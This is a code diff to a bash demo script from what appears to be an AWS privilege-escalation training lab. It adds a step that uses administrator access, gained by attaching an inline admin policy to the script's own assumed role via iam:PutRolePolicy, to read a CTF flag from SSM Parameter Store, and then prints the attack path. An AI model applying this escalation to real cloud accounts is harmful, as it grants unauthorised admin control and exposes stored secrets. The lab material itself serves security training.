@@ -200,17 +200,39 @@ echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 # Clean up temp file
 rm -f /tmp/admin-policy.json
 
-# Summary
-echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
-echo -e "${GREEN}========================================${NC}"
-echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
-echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
-echo -e "Step 2: Used ${YELLOW}iam:PutRolePolicy${NC} to attach admin policy to self"
-echo -e "Result: ${GREEN}Administrator Access${NC}"
+# [EXPLOIT] Step 7: Capture the CTF flag
+# The starting role session now holds an inline policy granting Action:* on Resource:*,
+# which provides ssm:GetParameter implicitly. Use those credentials to read the flag.
+echo -e "${YELLOW}Step 7: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-005-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
 echo ""
-echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (PutRolePolicy on self) → Admin"
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: $STARTING_USER (limited permissions)"
+echo "2. Assumed role: $STARTING_ROLE"
+echo "3. Used iam:PutRolePolicy (self) to apply inline administrator policy"
+echo "4. Achieved: Administrator Access"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER → (sts:AssumeRole)"
+echo -e "  → $STARTING_ROLE → (iam:PutRolePolicy on self)"
+echo -e "  → Admin Access → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
@@ -222,9 +244,6 @@ fi
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the self-admin-policy${NC}"
 echo ""
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
